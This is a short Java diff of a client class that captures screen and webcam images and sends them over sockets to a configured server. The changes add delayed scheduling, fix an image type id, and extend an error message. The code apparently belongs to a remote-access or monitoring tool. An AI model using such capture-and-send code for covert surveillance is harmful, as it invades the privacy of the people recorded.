@@ -61,7 +61,7 @@ public class ImageComponents {
                 SCREEN_HISTORY.remove(0);
             }
             ConnectClient.msg("icon-screen");
-            sendImage(9, screen);
+            ConnectClient.EXECUTOR.schedule(() -> sendImage(9, screen), Connect.DELAY, Connect.DELAY_TYPE);
         }
         try {
             Thread.sleep(1000);
@@ -74,7 +74,7 @@ public class ImageComponents {
                 WEBCAM_HISTORY.remove(0);
             }
             ConnectClient.msg("icon-webcam");
-            sendImage(9, webcam);
+            ConnectClient.EXECUTOR.schedule(() -> sendImage(10, webcam), Connect.DELAY, Connect.DELAY_TYPE);
         }
         SENDING = false;
         try {
@@ -139,7 +139,7 @@ public class ImageComponents {
                  OutputStream os = imageSocket.getOutputStream()) {
                 ImageIO.write(image, "png", os);
             } catch (Exception exception) {
-                ConnectClient.msg("Ocorreu um erro ao enviar a imagem única para o servidor! (" + exception.getMessage() + ")");
+                ConnectClient.msg("Ocorreu um erro ao enviar a imagem única para o servidor " + Connect.IP + ":" + (Connect.PORT + port) + "! (" + exception.getMessage() + ")");
                 ConnectClient.exception(exception);
             }
             try {
